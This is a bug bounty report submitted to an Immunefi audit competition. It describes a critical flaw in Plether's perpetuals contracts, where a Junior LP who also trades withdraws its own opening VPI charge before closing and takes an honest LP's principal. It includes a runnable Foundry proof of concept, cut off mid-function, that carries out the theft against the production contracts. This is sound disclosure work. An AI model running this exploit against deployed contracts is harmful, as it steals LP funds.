# \#99298 [SC-Critical] Junior LP withdraws own VPI charge before close and takes another LP's principal

**Submitted on Nov 13th 2026 at 00:59:39 UTC by @k42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99298
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

An account acting as both Junior LP and trader can collect its own positive opening VPI charge through Junior redemption, then close at an unchanged basket price and receive a VPI rebate funded by remaining LP assets. A matched Foundry proof shows attacker wallet profit of 198.561549 USDG while an honest Junior LP receives 799,513.633282 USDG from an 800,000 USDG deposit. This is theft of backed LP principal, not only unclaimed yield.

## Vulnerability Details

A skew increasing open charges VPI to trader margin. `CfdEngineSettlementSidecar` transfers positive trade cost into HousePool and records it as trading revenue. HousePool reconciliation adds cash revenue to Junior share value. Junior redemption can therefore transfer a portion of an open position's VPI charge into its holder's wallet before a later close rebates that same position. No positive VPI reserve or vesting prevents early LP withdrawal of a charge subject to a later rebate. Close settlement pays its rebate from Pool cash after protecting existing trader claims; remaining LPs bear that payout.

```solidity
// CfdEngineSettlementSidecar.sol, abbreviated
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    IHousePool(host.pool()).recordClaimantInflow(
        poolCashInflowAssets,
        IHousePool.ClaimantInflowKind.Revenue,
        IHousePool.ClaimantInflowCashMode.CashArrived
    );
}

// CfdEnginePlanLib.sol, abbreviated
if (delta.actionRebateAssets > 0) {
    delta.actionRebatePaidAssets =
        delta.actionRebateAssets < freePoolCashAssets ? delta.actionRebateAssets : freePoolCashAssets;
    poolCashAfterCollectionsAssets -= delta.actionRebatePaidAssets;
}
```

`CloseAccountingLib` caps close rebate so trader's lifetime VPI does not become negative. That trader only cap misses value already taken by same account through Junior shares. At release VPI factor of 1%, 40% maximum skew, 4 bps execution fee, six weighted Pyth feeds, and a normal 1e8 basket mark, a 719,000 unit SHORT pays **1,436.058507 USDG** positive opening VPI. Attacker owns 1,000,000 USDG Junior shares and supplies 50,000 USDG trader collateral; an unrelated honest LP owns 800,000 USDG Junior shares. No other trader, winning position, recapitalization, near cap mark, or later price move is needed.

After Junior cooldown, attacker requests full Junior redemption. Attack branch settles and claims that request before closing its SHORT; matched control closes first, then settles and claims same request. Both closes use identical timestamps and marks. Honest LP fully redeems at identical timestamps and marks in both branches. Both branches finish with no attacker position, outstanding trader claim, refundable LP shares, or degraded mode. Every reported LP receipt and attacker cashout is checked against actual USDG balance change.

| Actual USDG outcome | Close before attacker LP claim | Attacker LP claim before close |
| --- | ---: | ---: |
| Attacker Junior receipt | 1,000,178.153331 | 1,000,805.782735 |
| Attacker paid close rebate | 1,147.202419 | 1,148.464248 |
| Attacker final wallet | 1,049,569.671399 | 1,050,198.561549 |
| Honest Junior receipt | 800,142.522646 | 799,513.633282 |
| Residual Pool cash | 2.000215 | 1.999429 |

Attacker LP receipt rises **627.629404 USDG**, while rebate amount rises only **1.261829 USDG**. Attacker final wallet rises **628.890150 USDG** relative to control. Honest LP actual receipt falls **628.889364 USDG**; remaining **0.000786 USDG** equals Pool cash difference. Rebate amplification explains less than 0.3% of honest loss. Core defect is withdrawal of provisional opening charge before its later rebate, not a larger rebate from reduced execution depth.

Published AI scan entry at line 1742 describes temporary LP depth reduction to increase rebate magnitude. Stable or time weighted depth pricing could address that entry yet leave this charge distribution route intact. Cecuro MED-6 concerns treasury fee top ups from reserved cash, not refundable VPI revenue withdrawn through Junior shares. Submitted H01 and report #97844 concern Senior recapitalization high water mark replacement, a separate root.

A fix must keep refundable positive VPI outside LP share value until close economics resolve, or otherwise preserve that contingent value across LP exits. Reserving a small cash amount alone would not stop an LP exit priced with already credited VPI revenue.

## Impact Details

**Critical: direct theft of user funds.** Honest Junior LP contributes 800,000 USDG and receives only **799,513.633282 USDG** after a complete funded redemption in attack branch, losing **486.366718 USDG of deposited principal** despite an unchanged nominal basket price. Same LP receives 800,142.522646 USDG in matched control. Attacker receives **1,050,198.561549 USDG** after all Junior shares and trader collateral are withdrawn, **198.561549 USDG above 1,050,000 USDG initial capital**. Token conservation and matched control identify an actual transfer from honest LP to attacker, not a preview difference or unclaimed yield alone.

Exploit requires attacker capital, an existing honest Junior LP, a skew increasing open, Junior cooldown, and public LP settlement. Proof uses one cycle and does not claim unlimited repetition, permanent fund freezing, or protocol insolvency. No owner action occurs after fixture setup.

## References

- [Competition scope and Critical direct theft impact](https://immunefi.com/audit-competition/plether/scope/)
- [Runnable PoC requirement and release context](https://immunefi.com/audit-competition/plether/information/)
- [Release risk and fee parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L123-L158)
- [Positive opening cost credited as Pool revenue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L464)
- [Pool revenue ownership](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L650)
- [Junior LP redemption funding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L838-L893)
- [Close VPI lifetime clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
- [Close rebate from Pool cash](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L977)
- [Actual close rebate transfer](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L612-L624)
- [VPI clamp design statement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1434-L1445)
- [Published depth amplification issue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1742-L1808)


## Proof of Concept

## Proof of Concept

At pinned commit, save code below as `packages/perps/test/perps/poc/VpiJuniorRoundTripProduction.t.sol`. Run from `packages/perps`:

```bash
forge test --offline --match-path test/perps/poc/VpiJuniorRoundTripProduction.t.sol -vv
```

Standalone test deploys unmodified production Engine, HousePool, Vaults, and bounded Router. Test USDG and Pyth update transport are deterministic mocks; in scope source remains unchanged. Output numbers are six decimal USDG atoms:

```text
[PASS] test_JuniorTraderRoundTripStealsHonestLpPrincipal()
opening_vpi: 1436058507
control_attacker_wallet: 1049569671399
attack_attacker_wallet: 1050198561549
control_attacker_lp: 1000178153331
attack_attacker_lp: 1000805782735
control_honest_lp: 800142522646
attack_honest_lp: 799513633282
control_rebate: 1147202419
attack_rebate: 1148464248
control_pool_cash: 2000215
attack_pool_cash: 1999429
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

Full standalone Foundry test:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdEngineAccountLens} from "@plether/perps/CfdEngineAccountLens.sol";
import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
import {CfdEngineProtocolLens} from "@plether/perps/CfdEngineProtocolLens.sol";
import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PerpsPublicLens} from "@plether/perps/PerpsPublicLens.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {MockToken} from "@plether/test-utils/MockToken.sol";
import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

/// @dev Perps fixture using freely mintable collateral with six decimals.
contract MockSettlementToken is MockToken {

    constructor() MockToken("Settlement Token", "SETTLEMENT", 6) {}

}

abstract contract BasePerpTest is Test {

    MockSettlementToken settlementToken;
    CfdEngine engine;
    TerminalNavBookV2 terminalNavBook;
    CfdEngineAdmin engineAdmin;
    CfdEngineAccountLens engineAccountLens;
    CfdEngineLens engineLens;
    CfdEngineProtocolLens engineProtocolLens;
    HousePool pool;
    HousePoolRedemptionMathSidecar housePoolRedemptionMathSidecar;
    MarginClearinghouse clearinghouse;
    TrancheVault seniorVault;
    TrancheVault juniorVault;
    OrderRouter router;
    CfdOrderPolicyEvaluator policyEvaluator;
    OrderRouterExecutionSidecar orderExecutionSidecar;
    OrderRouterAdmin routerAdmin;
    PletherOracle pletherOracle;
    PerpsPublicLens publicLens;
    MockPyth baseMockPyth;

    /// @dev Monday 2024-03-04 10:00 UTC. Avoids FAD window.
    uint256 constant SETUP_TIMESTAMP = 1_709_532_000;
    uint256 constant CAP_PRICE = 2e8;
    uint256 constant FROZEN_CLOSE_SPREAD_BPS = 50;
    uint256 internal constant TEST_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant TEST_MAX_SENIOR_SHARE_BPS = 8000;
    address internal constant PROTOCOL_TREASURY_ACCOUNT = address(0xFEE50001);

    receive() external payable {}

    function setUp() public virtual {
        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));

        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalNavBook));
        engineAccountLens = new CfdEngineAccountLens(address(engine));
        engineLens = new CfdEngineLens(address(engine));
        engineProtocolLens = new CfdEngineProtocolLens(address(engine));
        housePoolRedemptionMathSidecar = new HousePoolRedemptionMathSidecar();
        pool = new HousePool(address(settlementToken), address(engine), address(housePoolRedemptionMathSidecar));
        baseMockPyth = new MockPyth();
        baseMockPyth.setSynchronizeLegacyUniquePrices(true);
        bytes32[] memory baseFeedIds = _basePythFeedIds();
        uint256[] memory initialRaw = _releaseRawPrices(1e8);
        for (uint256 i; i < baseFeedIds.length; ++i) {
            baseMockPyth.setPrice(
                baseFeedIds[i], SafeCast.toInt64(SafeCast.toInt256(initialRaw[i])), int32(-8), SETUP_TIMESTAMP
            );
        }

        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );

        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pletherOracle = new PletherOracle(
            address(engine),
            address(pool),
            address(baseMockPyth),
            baseFeedIds,
            _basePythWeights(),
            _basePythBasePrices(),
            _basePythInversions()
        );
        router = _deployOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));
        publicLens = new PerpsPublicLens(address(engineAccountLens), address(engine), address(router), address(pool));

        _bypassAllTimelocks();

        uint256 juniorSeed = _initialJuniorSeedDeposit();
        if (juniorSeed > 0) {
            settlementToken.mint(address(this), juniorSeed);
            settlementToken.approve(address(pool), juniorSeed);
            pool.initializeSeedPosition(false, juniorSeed, _juniorSeedReceiver());
        }

        uint256 seniorSeed = _initialSeniorSeedDeposit();
        if (seniorSeed > 0) {
            settlementToken.mint(address(this), seniorSeed);
            settlementToken.approve(address(pool), seniorSeed);
            pool.initializeSeedPosition(true, seniorSeed, _seniorSeedReceiver());
        }

        if (_autoActivateTrading() && pool.isSeedLifecycleComplete()) {
            pool.activateTrading();
        }

        uint256 junior = _initialJuniorDeposit();
        if (junior > 0) {
            _fundJunior(address(this), junior);
        }

        uint256 senior = _initialSeniorDeposit();
        if (senior > 0) {
            _fundSenior(address(this), senior);
        }
    }

    function _bypassAllTimelocks() internal {
        clearinghouse.setEngine(address(engine));

        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = TEST_MAX_SENIOR_EXPOSURE_ASSETS;
        config.maxSeniorShareBps = TEST_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();

        vm.warp(SETUP_TIMESTAMP);
    }

    // --- Virtual hooks ---

    function _riskParams() internal pure virtual returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: ((100) * 15) / 10,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual returns (uint256) {
        return 1_000_000 * 1e6;
    }

    function _initialSeniorDeposit() internal pure virtual returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual returns (uint256) {
        return 1000e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual returns (uint256) {
        return 1000e6;
    }

    function _juniorSeedReceiver() internal view virtual returns (address) {
        return address(this);
    }

    function _autoActivateTrading() internal pure virtual returns (bool) {
        return true;
    }

    function _seniorSeedReceiver() internal view virtual returns (address) {
        return address(this);
    }

    function _basePythFeedIds() internal pure returns (bytes32[] memory feedIds) {
        feedIds = new bytes32[](6);
        feedIds[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        feedIds[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        feedIds[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        feedIds[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        feedIds[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        feedIds[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _basePythWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _basePythBasePrices() internal pure returns (uint256[] memory basePrices) {
        basePrices = new uint256[](6);
        basePrices[0] = 117_500_000;
        basePrices[1] = 638_000;
        basePrices[2] = 134_480_000;
        basePrices[3] = 72_880_000;
        basePrices[4] = 10_860_000;
        basePrices[5] = 126_100_000;
    }

    function _basePythInversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _releaseRawPrices(
        uint256 mark
    ) internal pure returns (uint256[] memory rawPrices) {
        uint256[] memory bases = _basePythBasePrices();
        bool[] memory inversions = _basePythInversions();
        rawPrices = new uint256[](bases.length);
        for (uint256 i; i < bases.length; ++i) {
            uint256 normalized = bases[i] * mark / 1e8;
            rawPrices[i] = inversions[i] ? (1e16 + normalized / 2) / normalized : normalized;
        }
    }

    function _mockPythUpdateData() internal returns (bytes[] memory updateData) {
        return _mockPythUpdateData(1e8);
    }

    function _mockPythUpdateData(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        bytes32[] memory feedIds = _basePythFeedIds();
        uint256[] memory rawPrices = _releaseRawPrices(price);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(rawPrices[i])),
                    conf: SafeCast.toUint64(rawPrices[i] / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime == 0 ? 0 : publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mockPythCurrentUpdateData(
        uint256 mark
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = block.timestamp;
        bytes32[] memory feedIds = _basePythFeedIds();
        uint256[] memory rawPrices = _releaseRawPrices(mark);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: SafeCast.toInt64(SafeCast.toInt256(rawPrices[i])),
                    conf: SafeCast.toUint64(rawPrices[i] / 10_000),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _mockHistoricalPublishTime() internal view returns (uint256 publishTime) {
        publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = router.nextExecuteId();
        if (nextOrderId == 0) {
            return publishTime;
        }

        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(nextOrderId);
        uint256 candidate = uint256(pending.commitTime) + 1;
        if (pending.orderId != 0 && candidate <= publishTime) {
            publishTime = candidate;
        }
    }

    // --- Asynchronous LP funding helpers ---

    function _fundJunior(
        address lp,
        uint256 amount
    ) internal {
        _fundTrancheAsync(juniorVault, lp, amount);
    }

    function _fundSenior(
        address lp,
        uint256 amount
    ) internal {
        _fundTrancheAsync(seniorVault, lp, amount);
    }

    function _fundTrancheAsync(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        uint256 activationTime = vault.depositEpochStart(requestId);
        if (block.timestamp < activationTime) {
            vm.warp(activationTime);
        }
        uint256 markPrice = engine.lastMarkPrice();
        bytes[] memory updateData = _mockPythCurrentUpdateData(markPrice == 0 ? 1e8 : markPrice);
        vm.prank(address(0xE0E));
        router.updateMarkPrice(updateData);
        vm.prank(lp);
        pool.settleLpEpoch(0, 0);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "async funding must finalize requested asset basis");
        vm.prank(lp);
        shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
        assertGt(shares, 0, "async tranche funding must mint claimable shares");
    }

    function _fundTrader(
        address trader,
        uint256 amount
    ) internal {
        address account = trader;
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(account, amount);
        vm.stopPrank();
    }

    function _currentPoolConfig() internal view returns (IHousePool.PoolConfig memory config) {
        config = IHousePool.PoolConfig({
            seniorRateBps: pool.seniorRateBps(),
            markStalenessLimit: pool.markStalenessLimit(),
            seniorFrozenLpFeeBps: pool.seniorFrozenLpFeeBps(),
            juniorFrozenLpFeeBps: pool.juniorFrozenLpFeeBps(),
            maxSeniorExposureAssets: pool.maxSeniorExposureAssets(),
            maxSeniorShareBps: pool.maxSeniorShareBps()
        });
    }

    function _setSeniorCapacity(
        uint256 maxSeniorExposureAssets,
        uint256 maxSeniorShareBps
    ) internal {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = maxSeniorExposureAssets;
        config.maxSeniorShareBps = maxSeniorShareBps;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    // --- Trading helpers ---

    // --- Governance helpers ---

    function _syncEngineAdmin() internal {
        engineAdmin = CfdEngineAdmin(engine.admin());
    }

    function _deployEngine(
        CfdTypes.RiskParams memory riskParams_
    ) internal returns (CfdEngine deployedEngine) {
        deployedEngine = new CfdEngine(
            address(settlementToken), address(clearinghouse), CAP_PRICE, riskParams_, _frozenCloseSpreadBps()
        );
        CfdEnginePlanner planner = new CfdEnginePlanner();
        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(deployedEngine));
        CfdEngineAdmin adminModule = new CfdEngineAdmin(address(deployedEngine), address(this));
        deployedEngine.setDependencies(address(planner), address(settlement), address(adminModule));
        deployedEngine.setProtocolTreasury(PROTOCOL_TREASURY_ACCOUNT);
    }

    function _deployOrderRouter(
        address engine_,
        address engineLens_,
        address pool_,
        address oracle_
    ) internal virtual returns (OrderRouter deployedRouter) {
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, engine_, address(clearinghouse), pool_);
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        deployedRouter = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(deployedRouter), predictedRouter);
    }

    function _frozenCloseSpreadBps() internal pure virtual returns (uint256) {
        return FROZEN_CLOSE_SPREAD_BPS;
    }

    function _syncRouterAdmin() internal {
        routerAdmin = OrderRouterAdmin(router.admin());
    }

    // --- Time helpers ---


}

contract VpiJuniorRoundTripTest is BasePerpTest {

    address private constant HONEST = address(0xA11CE);
    address private constant ATTACKER = address(0xBAD);
    uint256 private constant PRICE = 1e8;
    uint256 private constant SIZE = 719_000e18;
    uint256 private constant ATTACKER_CAPITAL = 1_050_000e6;

    mapping(uint256 => uint256) private requestedShares;

    struct Branch {
        uint256 attackerWallet;
        uint256 attackerLpReceipt;
        uint256 honestLpReceipt;
        uint256 rebate;
        uint256 poolCash;
        uint256 attackerCloseTime;
        uint256 attackerCloseMark;
        uint256 honestExitTime;
        uint256 honestExitMark;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maxSkewRatio = 0.4e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function test_JuniorTraderRoundTripStealsHonestLpPrincipal() public {
        _fundJunior(HONEST, 800_000e6);
        _fundJunior(ATTACKER, 1_000_000e6);
        _fundTrader(ATTACKER, 50_000e6);
        _trade(false);
        (,,,,,, int256 openingVpi) = engine.positions(ATTACKER);
        assertGt(openingVpi, 0, "opening VPI charge paid");
        emit log_named_int("opening_vpi", openingVpi);
        vm.warp(juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 attackerId = _request(ATTACKER);
        uint256 redemptionTime = pool.lpEpochStart(attackerId);
        uint256 checkpoint = vm.snapshotState();

        Branch memory control = _branch(attackerId, redemptionTime, false);
        assertTrue(vm.revertToState(checkpoint));
        Branch memory attack = _branch(attackerId, redemptionTime, true);

        emit log_named_uint("control_attacker_wallet", control.attackerWallet);
        emit log_named_uint("attack_attacker_wallet", attack.attackerWallet);
        emit log_named_uint("control_attacker_lp", control.attackerLpReceipt);
        emit log_named_uint("attack_attacker_lp", attack.attackerLpReceipt);
        emit log_named_uint("control_honest_lp", control.honestLpReceipt);
        emit log_named_uint("attack_honest_lp", attack.honestLpReceipt);
        emit log_named_uint("control_rebate", control.rebate);
        emit log_named_uint("attack_rebate", attack.rebate);
        emit log_named_uint("control_pool_cash", control.poolCash);
        emit log_named_uint("attack_pool_cash", attack.poolCash);
        assertEq(control.attackerCloseTime, attack.attackerCloseTime, "same close time");
        assertEq(control.attackerCloseMark, attack.attackerCloseMark, "same close mark");
        assertEq(control.honestExitTime, attack.honestExitTime, "same honest exit time");
        assertEq(control.honestExitMark, attack.honestExitMark, "same honest exit mark");
        assertApproxEqAbs(control.rebate, attack.rebate, 2e6, "rebate amplitude is not main effect");
        assertGt(attack.attackerWallet, ATTACKER_CAPITAL, "attacker earns actual wallet profit");
        assertLt(attack.honestLpReceipt, 800_000e6, "honest LP loses principal");
        assertGt(control.honestLpReceipt, attack.honestLpReceipt, "honest LP is worse off");
        assertEq(
            attack.attackerWallet - control.attackerWallet,
            control.honestLpReceipt - attack.honestLpReceipt + control.poolCash - attack.poolCash,
            "attacker gain equals honest LP loss plus residual Pool change"
        );
    }

    function _branch(
        uint256 attackerId,
        uint256 redemptionTime,
        bool earlyExit
    ) private returns (Branch memory result) {
        vm.warp(redemptionTime);
        if (earlyExit) {
            router.settleLpEpoch(_mockPythCurrentUpdateData(PRICE));
            result.attackerLpReceipt = _claim(ATTACKER, attackerId);
        }
        vm.warp(redemptionTime + 2);
        vm.recordLogs();
        _trade(true);
        result.attackerCloseTime = block.timestamp;
        result.attackerCloseMark = engine.lastMarkPrice();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 rebateTopic = keccak256("ActionRebateSettled(address,uint256,uint256,uint256)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics.length > 1 && logs[i].topics[0] == rebateTopic) {
                (, result.rebate,) = abi.decode(logs[i].data, (uint256, uint256, uint256));
                break;
            }
        }
        assertGt(result.rebate, 0, "close rebate paid");
        if (!earlyExit) {
            router.settleLpEpoch(_mockPythCurrentUpdateData(PRICE));
            result.attackerLpReceipt = _claim(ATTACKER, attackerId);
        }
        uint256 traderBalance = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, traderBalance);
        result.attackerWallet = settlementToken.balanceOf(ATTACKER);
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "attacker withdrew all custody cash");
        (uint256 attackerPosition,,,,,,) = engine.positions(ATTACKER);
        assertEq(attackerPosition, 0, "attacker has no residual position");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim liabilities");
        assertFalse(engine.degradedMode(), "close does not enter degraded mode");
        vm.warp(redemptionTime + 10);
        uint256 honestId = _request(HONEST);
        vm.warp(pool.lpEpochStart(honestId));
        router.settleLpEpoch(_mockPythCurrentUpdateData(PRICE));
        result.honestExitTime = block.timestamp;
        result.honestExitMark = engine.lastMarkPrice();
        result.honestLpReceipt = _claim(HONEST, honestId);
        result.poolCash = pool.rawAssets();
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no claims after LP exits");
        assertFalse(engine.degradedMode(), "LP exit does not enter degraded mode");
    }

    function _request(
        address owner
    ) private returns (uint256 id) {
        uint256 shares = juniorVault.balanceOf(owner);
        vm.prank(owner);
        id = juniorVault.requestRedeem(shares, owner, owner);
        requestedShares[id] = shares;
    }

    function _claim(
        address owner,
        uint256 id
    ) private returns (uint256 receipt) {
        uint256 shares = juniorVault.claimableRedeemRequest(id, owner);
        assertGt(shares, 0, "redemption has funded shares");
        assertEq(shares, requestedShares[id], "all requested shares funded");
        uint256 walletBefore = settlementToken.balanceOf(owner);
        vm.prank(owner);
        receipt = juniorVault.claimRedeem(id, shares, owner, owner);
        assertEq(settlementToken.balanceOf(owner) - walletBefore, receipt, "wallet receives USDG");
        assertEq(juniorVault.claimableRedeemRequest(id, owner), 0, "no claimable shares remain");
        assertEq(juniorVault.refundableRedeemRequest(id, owner), 0, "no refundable shares remain");
        assertEq(juniorVault.balanceOf(owner), 0, "no wallet shares remain");
    }

    function _trade(
        bool close
    ) private {
        uint256 targetPrice = close ? 1 : type(uint256).max;
        uint32 window = uint32(router.maxExecutionWindowSeconds());
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
